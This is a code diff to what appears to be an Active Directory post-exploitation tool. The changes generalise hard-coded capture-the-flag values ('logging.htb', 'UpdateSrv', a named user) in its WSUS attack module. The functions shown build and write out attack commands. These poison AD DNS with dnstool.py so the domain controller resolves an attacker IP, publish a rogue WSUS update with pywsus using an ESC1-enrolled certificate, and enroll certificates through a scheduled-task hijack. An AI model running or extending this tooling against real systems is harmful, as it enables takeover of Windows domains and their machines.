@@ -27,7 +27,9 @@ def resolve_wsus_host(session: Session) -> str:
     """WSUS endpoint FQDN — often the DC hostname when WSUS is co-located."""
     if session.workspace is None:
         raise RuntimeError("no active workspace")
-    domain = session.workspace.domain or "logging.htb"
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain configured")
     ws_path = str(session.workspaces.path_for(session.workspace.name))
     fqdn = resolve_dc_fqdn(ws_path, domain, fallback_ip=pick_dc_ip(session))
     return fqdn or pick_dc_ip(session) or "<wsus_host>"
@@ -37,15 +39,15 @@ def build_pywsus_publish_commands(
     *,
     wsus_host: str,
     pfx_path: str | Path,
-    domain: str = "logging.htb",
-    template: str = "UpdateSrv",
+    domain: str = "",
+    template: str = "",
     wsus_port: int = 8530,
-    target_fqdn: str = "DC01.logging.htb",
+    target_fqdn: str = "",
 ) -> list[str]:
     pfx = Path(pfx_path)
     base = f"https://{wsus_host}:{wsus_port}" if wsus_port != 8530 else f"https://{wsus_host}:8530"
     return [
-        "# UpdateSrv / ESC1 WSUS — Server Auth cert for WSUS endpoint (not PKINIT login)",
+        f"# ESC1 WSUS — Server Auth cert for WSUS endpoint (not PKINIT login)",
         f"# PFX (Subject/SAN = {target_fqdn}): {pfx}",
         "# 1) Optional: poison AD DNS so DC resolves your rogue WSUS host",
         f"#    dnstool.py -u '<owned_user>' -p '<pass>' --record {target_fqdn} --action add --data <attacker_ip>",
@@ -53,7 +55,7 @@ def build_pywsus_publish_commands(
         "# 2) Rogue WSUS publish (pywsus / wsuks) with enrolled PFX",
         f"python3 pywsus.py -s {base} -c '{pfx}' publish -t {target_fqdn}",
         f"# Alt with creds: python3 pywsus.py -u '<user>@{domain}' -p '<pass>' -s {base} -c '{pfx}' publish -t {target_fqdn}",
-        f"# WSUS share indicator: \\\\{target_fqdn.split('.')[0]}\\WSUSTemp | template: {template}",
+        f"# WSUS share indicator: \\\\{target_fqdn.split('.')[0] if target_fqdn else '<wsus_dc_name>'}\\WSUSTemp | template: {template}",
     ]
 
 
@@ -66,13 +68,15 @@ def write_wsus_publish_script(
     """Write executable publish helper into workspace/wsus/."""
     if session.workspace is None:
         raise RuntimeError("no active workspace")
-    domain = session.workspace.domain or "logging.htb"
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain configured")
     ws_path = session.workspaces.path_for(session.workspace.name)
     out_dir = ws_path / "wsus"
     out_dir.mkdir(parents=True, exist_ok=True)
 
     host = wsus_host or resolve_wsus_host(session)
-    cert_dns = host if "." in host else f"DC01.{domain}"
+    cert_dns = host if "." in host else f"dc01.{domain}"
     if pfx_path is None:
         existing = sorted((ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)
         pfx_path = existing[0] if existing else ws_path / "certs" / f"{cert_dns.replace('.', '_')}.pfx"
@@ -126,9 +130,11 @@ def run_wsus_cert_chain(
         raise ValueError(f"WSUS op not found: {op_id} — run wsus first")
 
     host = wsus_host or resolve_wsus_host(session)
-    domain = session.workspace.domain or "logging.htb"
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain configured")
     ws_path = session.workspaces.path_for(session.workspace.name)
-    cert_dns = host if "." in host else f"DC01.{domain}"
+    cert_dns = host if "." in host else f"dc01.{domain}"
     pfx_path: Path | None = None
 
     from admapper.postex.analyze import resolve_hijack_op_id
@@ -143,8 +149,8 @@ def run_wsus_cert_chain(
     enroll_ok = bool(pfx_path)
     if enroll and not pfx_path:
         print_info(
-            "WSUS chain — enroll UpdateSrv via task hijack "
-            "(no reverse shell; wait for Update Check as jaylee.clifton)"
+            "WSUS chain — enroll cert template via task hijack "
+            "(no reverse shell; wait for scheduled task execution)"
         )
         print_info("enrolling certificate via scheduled-task hijack (task user context) …")
         result = run_enroll_hijack(
